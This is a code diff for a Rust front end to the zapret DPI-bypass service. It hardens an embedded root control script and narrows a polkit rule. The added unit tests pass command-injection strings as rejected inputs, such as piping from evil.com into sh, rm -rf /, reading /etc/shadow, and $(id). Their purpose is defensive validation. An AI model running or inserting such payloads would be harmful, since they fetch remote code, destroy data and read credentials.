     systemctl start zapret 2>/dev/null || rc-service zapret start 2>/dev/null || sv up zapret 2>/dev/null || service zapret start 2>/dev/null || dinitctl start zapret 2>/dev/null || true
+}
+
+is_zapret_proc() {
+    _p="$1"
+    [ -d "/proc/$_p" ] || return 1
+    _c=$(cat "/proc/$_p/comm" 2>/dev/null || true)
+    case "$_c" in
+        nfqws|tpws|dvtws|mdig|ip2net) return 0 ;;
+    esac
+    _cmd=$(tr '\0' ' ' < "/proc/$_p/cmdline" 2>/dev/null || true)
+    case "$_cmd" in
+        *"/opt/zapret/blockcheck.sh"*|*"/opt/zapret/install_easy.sh"*|*"zapret_installer_job.sh"*|*"/usr/bin/zapret-control"*) return 0 ;;
+        *) return 1 ;;
+    esac
+}
+
+kill_proc_tree() {
+    _parent="$1"
+    [ -z "$_parent" ] && return
+    for _child in $(pgrep -P "$_parent" 2>/dev/null); do
+        kill_proc_tree "$_child"
+    done
+    if is_zapret_proc "$_parent"; then
+        kill -9 "$_parent" 2>/dev/null || true
+    fi
 }
 
 case "$1" in
@@ -3804,51 +3877,40 @@ case "$1" in
             cat /opt/zapret/config
         fi
         ;;
-    apply-config)
-        temp_cfg="$2"
-        temp_hosts="$3"
-        if [ -n "$temp_cfg" ] && [ -f "$temp_cfg" ] && [ ! -L "$temp_cfg" ]; then
-            mkdir -p /opt/zapret
-            cp -f "$temp_cfg" /opt/zapret/config
-            chmod 644 /opt/zapret/config
-            chown root:root /opt/zapret/config 2>/dev/null || true
-            rm -f "$temp_cfg"
+    apply-strategy)
+        # Reads single strategy string from stdin
+        read -r raw_strat
+        # Whitelist: alphanumeric, -, _, =, +, :, ,, ., /, <, >, space
+        if echo "$raw_strat" | grep -q '[^a-zA-Z0-9_\-=+:,.<>/ ]'; then
+            echo "Security Error: Prohibited characters in strategy string." >&2
+            exit 1
         fi
-        if [ -n "$temp_hosts" ] && [ -f "$temp_hosts" ] && [ ! -L "$temp_hosts" ]; then
-            mkdir -p /opt/zapret/ipset
-            cp -f "$temp_hosts" /opt/zapret/ipset/zapret-hosts-user.txt
-            chmod 644 /opt/zapret/ipset/zapret-hosts-user.txt
-            chown root:root /opt/zapret/ipset/zapret-hosts-user.txt 2>/dev/null || true
-            rm -f "$temp_hosts"
+        if [ -f /opt/zapret/config ]; then
+            sed -i "s|^NFQWS_OPT=.*|NFQWS_OPT=\"$raw_strat\"|" /opt/zapret/config
         fi
         restart_service
         ;;
-    update)
-        cd /opt/zapret
-        git config --global --add safe.directory /opt/zapret || true
-        git fetch origin
-        git reset --hard origin/master || git pull origin master
-        make -B
-        if [ -f /opt/zapret/install_bin.sh ]; then
-            sh /opt/zapret/install_bin.sh || true
+    apply-hostlist)
+        # Mode argument: "none" or "hostlist"
+        mode="$2"
+        case "$mode" in
+            none|hostlist) ;;
+            *) echo "Security Error: Invalid filter mode." >&2; exit 1 ;;
+        esac
+
+        mkdir -p /opt/zapret/ipset
+        tmp_target="/opt/zapret/ipset/zapret-hosts-user.txt.tmp"
+        final_target="/opt/zapret/ipset/zapret-hosts-user.txt"
+
+        cat > "$tmp_target"
+        mv -f "$tmp_target" "$final_target"
+        chmod 644 "$final_target"
+        chown root:root "$final_target" 2>/dev/null || true
+
+        if [ -f /opt/zapret/config ]; then
+            sed -i "s|^MODE_FILTER=.*|MODE_FILTER=$mode|" /opt/zapret/config
         fi
         restart_service
-        ;;
-    uninstall)
-        stop_service
-        systemctl disable zapret 2>/dev/null || true
-        systemctl disable zapret-list-update.timer 2>/dev/null || true
-        rc-update del zapret default 2>/dev/null || true
-        rm -rf /etc/runit/runsvdir/default/zapret /var/service/zapret /etc/service/zapret /run/runit/service/zapret 2>/dev/null || true
-        if command -v update-rc.d >/dev/null 2>&1; then update-rc.d -f zapret remove 2>/dev/null || true; elif command -v chkconfig >/dev/null 2>&1; then chkconfig --del zapret 2>/dev/null || true; fi
-        dinitctl disable zapret 2>/dev/null || true
-        rm -f /etc/systemd/system/zapret* /usr/lib/systemd/system/zapret* 2>/dev/null || true
-        rm -f /etc/init.d/zapret /etc/rc.d/zapret /etc/dinit.d/zapret /etc/dinit.d/boot.d/zapret /etc/sv/zapret 2>/dev/null || true
-        systemctl daemon-reload 2>/dev/null || true
-        rm -rf /opt/zapret 2>/dev/null || true
-        rm -f /etc/polkit-1/rules.d/90-zapret-gtk.rules /etc/polkit-1/localauthority/50-local.d/90-zapret-gtk.pkla 2>/dev/null || true
-        rm -f /usr/bin/zapret-control /opt/zapret/zapret-control.sh 2>/dev/null || true
-        exit 0
         ;;
     blockcheck)
         shift
@@ -3867,75 +3929,113 @@ case "$1" in
         fi
         ;;
     easy-install)
-        shift
-        input_file="$1"
         if [ -f /opt/zapret/install_easy.sh ]; then
             export ZAPRET_BASE="/opt/zapret"
             cd /opt/zapret
-            if [ -n "$input_file" ] && [ -f "$input_file" ] && [ ! -L "$input_file" ]; then
-                /bin/sh /opt/zapret/install_easy.sh < "$input_file"
-                rm -f "$input_file"
-            else
-                printf "Y\nY\nN\n1\nN\nN\nY\nN\n\n\n" | /bin/sh /opt/zapret/install_easy.sh
-            fi
+            printf "Y\nY\nN\n1\nN\nN\nY\nN\n\n\n" | /bin/sh /opt/zapret/install_easy.sh
             sed -i 's/^NFQWS_ENABLE=.*/NFQWS_ENABLE=1/' /opt/zapret/config 2>/dev/null || true
-            cp -f /usr/bin/zapret-control /opt/zapret/zapret-control.sh 2>/dev/null || true
-            chmod 755 /opt/zapret/zapret-control.sh 2>/dev/null || true
+            rm -f /opt/zapret/zapret-control.sh 2>/dev/null || true
             restart_service
         fi
         ;;
     kill-pid)
         target_pid="$2"
-        if [ -n "$target_pid" ] && echo "$target_pid" | grep -Eq '^[0-9]+$' && [ "$target_pid" -gt 100 ]; then
-            for cpid in $(pgrep -P "$target_pid" 2>/dev/null); do
-                pkill -9 -P "$cpid" 2>/dev/null || true
-                kill -9 "$cpid" 2>/dev/null || true
-            done
-            pkill -9 -P "$target_pid" 2>/dev/null || true
-            kill -9 "$target_pid" 2>/dev/null || true
+        if [ -n "$target_pid" ] && echo "$target_pid" | grep -Eq '^[0-9]+$'; then
+            kill_proc_tree "$target_pid"
         fi
-        pkill -9 -f "blockcheck.sh" 2>/dev/null || true
-        pkill -9 -f "install_easy.sh" 2>/dev/null || true
+        for p in $(pgrep -f '/opt/zapret/blockcheck.sh' 2>/dev/null); do
+            kill -9 "$p" 2>/dev/null || true
+        done
+        for p in $(pgrep -f '/opt/zapret/install_easy.sh' 2>/dev/null); do
+            kill -9 "$p" 2>/dev/null || true
+        done
+        for p in $(pgrep -f 'zapret_installer_job.sh' 2>/dev/null); do
+            kill -9 "$p" 2>/dev/null || true
+        done
         pkill -9 -x nfqws 2>/dev/null || true
         pkill -9 -x tpws 2>/dev/null || true
         pkill -9 -x dvtws 2>/dev/null || true
         pkill -9 -x mdig 2>/dev/null || true
         pkill -9 -x ip2net 2>/dev/null || true
         ;;
+    cleanup-session)
+        target_pid="$2"
+        if [ -n "$target_pid" ] && echo "$target_pid" | grep -Eq '^[0-9]+$'; then
+            kill_proc_tree "$target_pid"
+        fi
+        for p in $(pgrep -f '/opt/zapret/blockcheck.sh' 2>/dev/null); do kill -9 "$p" 2>/dev/null || true; done
+        for p in $(pgrep -f '/opt/zapret/install_easy.sh' 2>/dev/null); do kill -9 "$p" 2>/dev/null || true; done
+        for p in $(pgrep -f 'zapret_installer_job.sh' 2>/dev/null); do kill -9 "$p" 2>/dev/null || true; done
+        pkill -9 -x nfqws 2>/dev/null || true
+        pkill -9 -x tpws 2>/dev/null || true
+        pkill -9 -x dvtws 2>/dev/null || true
+        pkill -9 -x mdig 2>/dev/null || true
+        pkill -9 -x ip2net 2>/dev/null || true
+        rm -f /run/polkit-1/rules.d/90-zapret-gtk.rules 2>/dev/null || true
+        ;;
+    clean-session)
+        rm -f /run/polkit-1/rules.d/90-zapret-gtk.rules 2>/dev/null || true
+        ;;
+    update)
+        cd /opt/zapret
+        git fetch origin
+        git reset --hard origin/master
+        make -B
+        [ -f /opt/zapret/install_bin.sh ] && sh /opt/zapret/install_bin.sh || true
+        restart_service
+        ;;
+    uninstall)
+        stop_service
+        systemctl disable zapret 2>/dev/null || true
+        systemctl disable zapret-list-update.timer 2>/dev/null || true
+        rc-update del zapret default 2>/dev/null || true
+        rm -rf /etc/runit/runsvdir/default/zapret /var/service/zapret /etc/service/zapret /run/runit/service/zapret 2>/dev/null || true
+        if command -v update-rc.d >/dev/null 2>&1; then update-rc.d -f zapret remove 2>/dev/null || true; elif command -v chkconfig >/dev/null 2>&1; then chkconfig --del zapret 2>/dev/null || true; fi
+        dinitctl disable zapret 2>/dev/null || true
+        rm -f /etc/systemd/system/zapret* /usr/lib/systemd/system/zapret* 2>/dev/null || true
+        rm -f /etc/init.d/zapret /etc/rc.d/zapret /etc/dinit.d/zapret /etc/dinit.d/boot.d/zapret /etc/sv/zapret 2>/dev/null || true
+        systemctl daemon-reload 2>/dev/null || true
+        rm -rf /opt/zapret
+        rm -f /run/polkit-1/rules.d/90-zapret-gtk.rules /etc/polkit-1/rules.d/90-zapret-gtk.rules /etc/polkit-1/localauthority/50-local.d/90-zapret-gtk.pkla /usr/bin/zapret-control /opt/zapret/zapret-control.sh 2>/dev/null || true
+        exit 0
+        ;;
     *)
-        echo "Usage: $0 {start|stop|restart|cat-config|apply-config <cfg> [hosts]|update|uninstall|blockcheck <repeats> <level> [domains]|easy-install [input_file]|kill-pid <pid>}"
+        echo "Usage: $0 {start|stop|restart|cat-config|apply-strategy|apply-hostlist <mode>|blockcheck <repeats> <level> [domains]|easy-install|kill-pid <pid>|cleanup-session <pid>|clean-session|update|uninstall}"
         exit 1
         ;;
 esac
 EOF
 chmod 755 /usr/bin/zapret-control 2>/dev/null || true
-cp -f /usr/bin/zapret-control /opt/zapret/zapret-control.sh 2>/dev/null || true
-chmod 755 /opt/zapret/zapret-control.sh 2>/dev/null || true
+rm -f /opt/zapret/zapret-control.sh 2>/dev/null || true
 
 CURRENT_USER=""
 if [ -n "$PKEXEC_UID" ]; then
     CURRENT_USER=$(getent passwd "$PKEXEC_UID" | cut -d: -f1)
 fi
+if [ -z "$CURRENT_USER" ] && [ -n "$SUDO_USER" ]; then
+    CURRENT_USER="$SUDO_USER"
+fi
 if [ -z "$CURRENT_USER" ]; then
-    CURRENT_USER=$(logname 2>/dev/null || whoami 2>/dev/null || true)
+    CURRENT_USER=$(logname 2>/dev/null || true)
 fi
 
-cat << EOF > /etc/polkit-1/rules.d/90-zapret-gtk.rules
-/* Zapret-GTK Restricted Polkit Rule */
+if [ -n "$CURRENT_USER" ] && [ "$CURRENT_USER" != "root" ] && echo "$CURRENT_USER" | grep -Eq '^[a-zA-Z0-9_.][a-zA-Z0-9_.-]*$'; then
+mkdir -p /run/polkit-1/rules.d 2>/dev/null || true
+cat << EOF > /run/polkit-1/rules.d/90-zapret-gtk.rules
+/* Zapret-GTK Ephemeral Runtime Rule */
 polkit.addRule(function(action, subject) {
     if (action.id == "org.freedesktop.policykit.exec") {
         var prog = action.lookup("program");
-        if (prog && (
-            prog == "/usr/bin/zapret-control" ||
-            prog == "/opt/zapret/zapret-control.sh"
-        ) && (subject.user == "$CURRENT_USER" || subject.isInGroup("wheel") || subject.isInGroup("sudo"))) {
+        if (prog && prog == "/usr/bin/zapret-control" && subject.user == "$CURRENT_USER") {
             return polkit.Result.YES;
         }
     }
 });
 EOF
-chmod 644 /etc/polkit-1/rules.d/90-zapret-gtk.rules 2>/dev/null || true
-rm -f /etc/polkit-1/localauthority/50-local.d/90-zapret-gtk.pkla 2>/dev/null || true
+chmod 644 /run/polkit-1/rules.d/90-zapret-gtk.rules 2>/dev/null || true
+rm -f /etc/polkit-1/rules.d/90-zapret-gtk.rules /etc/polkit-1/localauthority/50-local.d/90-zapret-gtk.pkla 2>/dev/null || true
+fi
+
 if [ -n "$PKEXEC_UID" ]; then
     U_HOME=$(getent passwd "$PKEXEC_UID" | cut -d: -f6)
     U_NAME=$(getent passwd "$PKEXEC_UID" | cut -d: -f1)
@@ -3946,6 +4046,23 @@ if [ -n "$PKEXEC_UID" ]; then
     fi
 fi
 "#
+}
+
+fn get_zapret_remote_commit_hash() -> Option<String> {
+    let remote_out = Command::new("git")
+        .args(["ls-remote", "https://github.com/bol-van/zapret.git", "HEAD"])
+        .output()
+        .ok()?;
+    if !remote_out.status.success() {
+        return None;
+    }
+    let remote_str = String::from_utf8_lossy(&remote_out.stdout);
+    let remote_hash = remote_str.split_whitespace().next()?.trim().to_string();
+    if remote_hash.is_empty() {
+        None
+    } else {
+        Some(remote_hash)
+    }
 }
 
 fn check_zapret_update_available() -> Option<bool> {
@@ -3965,19 +4082,7 @@ fn check_zapret_update_available() -> Option<bool> {
         return None;
     }
 
-    let remote_out = Command::new("git")
-        .args(["ls-remote", "https://github.com/bol-van/zapret.git", "HEAD"])
-        .output()
-        .ok()?;
-    if !remote_out.status.success() {
-        return None;
-    }
-    let remote_str = String::from_utf8_lossy(&remote_out.stdout);
-    let remote_hash = remote_str.split_whitespace().next()?.trim().to_string();
-    if remote_hash.is_empty() {
-        return None;
-    }
-
+    let remote_hash = get_zapret_remote_commit_hash()?;
     Some(local_hash != remote_hash)
 }
 
@@ -4132,3 +4237,81 @@ fn get_package_install_command(distro: &str, package: &str) -> Vec<String> {
         _ => vec![],
     }
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_is_safe_strategy_param() {
+        assert!(is_safe_strategy_param("--filter-tcp=80 --dpi-desync=fake,multisplit --dpi-desync-split-pos=method+2 --dpi-desync-fooling=md5sig"));
+        assert!(is_safe_strategy_param("--filter-tcp=443 --dpi-desync=fake <HOSTLIST>"));
+        assert!(is_safe_strategy_param("--dpi-desync=split2 --dpi-desync-split-pos=1"));
+        assert!(is_safe_strategy_param("--filter-tcp=80/24 --dpi-desync=fake"));
+        assert!(is_safe_strategy_param("--filter-tcp=80 --ipset=/opt/zapret/ipset/zapret-hosts-user.txt --dpi-desync=fake"));
+
+        assert!(!is_safe_strategy_param("--dpi-desync=fake\" ; curl evil.com|sh #"));
+        assert!(!is_safe_strategy_param("--dpi-desync=fake; rm -rf /"));
+        assert!(!is_safe_strategy_param("--dpi-desync=fake && whoami"));
+        assert!(!is_safe_strategy_param("--dpi-desync=fake | cat /etc/shadow"));
+        assert!(!is_safe_strategy_param("--dpi-desync=fake `whoami`"));
+        assert!(!is_safe_strategy_param("--dpi-desync=fake $(id)"));
+        assert!(!is_safe_strategy_param("--dpi-desync=fake\n--dpi-desync=bad"));
+        assert!(!is_safe_strategy_param("invalid-no-leading-dashes"));
+        assert!(!is_safe_strategy_param(""));
+    }
+
+    #[test]
+    fn test_is_valid_domain() {
+        assert!(is_valid_domain("google.com"));
+        assert!(is_valid_domain("discord.com"));
+        assert!(is_valid_domain("sub.domain.org"));
+        assert!(is_valid_domain("test-site.co.uk"));
+        assert!(is_valid_domain("discord.gg"));
+        assert!(is_valid_domain("youtube.com"));
+        assert!(is_valid_domain("sub_domain.com"));
+        assert!(is_valid_domain("_dmarc.example.com"));
+        assert!(is_valid_domain("a.com"));
+        assert!(is_valid_domain("x"));
+
+        assert!(!is_valid_domain(""));
+        assert!(!is_valid_domain("http://google.com"));
+        assert!(!is_valid_domain("https://google.com"));
+        assert!(!is_valid_domain("www.google.com"));
+    }
+
+    #[test]
+    fn test_parse_strategies_strict() {
+        let valid_json_objs = r#"[
+            {"strategy": "--filter-tcp=80 --dpi-desync=fake", "active": true},
+            {"strategy": "--filter-tcp=443 --dpi-desync=split2", "active": false}
+        ]"#;
+        let res = parse_strategies_strict(valid_json_objs);
+        assert!(res.is_ok());
+        let strats = res.unwrap();
+        assert_eq!(strats.len(), 2);
+        assert_eq!(strats[0].strategy, "--filter-tcp=80 --dpi-desync=fake");
+        assert_eq!(strats[1].strategy, "--filter-tcp=443 --dpi-desync=split2");
+
+        let valid_json_strings = r#"["--filter-tcp=80 --dpi-desync=fake", "--filter-tcp=443 --dpi-desync=split2"]"#;
+        let res_str = parse_strategies_strict(valid_json_strings);
+        assert!(res_str.is_ok());
+        assert_eq!(res_str.unwrap().len(), 2);
+
+        let dangerous_json_objs = r#"[
+            {"strategy": "--filter-tcp=80 --dpi-desync=fake", "active": true},
+            {"strategy": "--dpi-desync=fake\" ; rm -rf / #", "active": true}
+        ]"#;
+        let dangerous_res = parse_strategies_strict(dangerous_json_objs);
+        assert!(dangerous_res.is_err());
+
+        let dangerous_json_strings = r#"["--filter-tcp=80 --dpi-desync=fake", "--dpi-desync=fake && whoami"]"#;
+        let dangerous_str_res = parse_strategies_strict(dangerous_json_strings);
+        assert!(dangerous_str_res.is_err());
+
+        assert!(parse_strategies_strict("invalid json").is_err());
+        assert!(parse_strategies_strict("[]").is_err());
+    }
+}
+
+
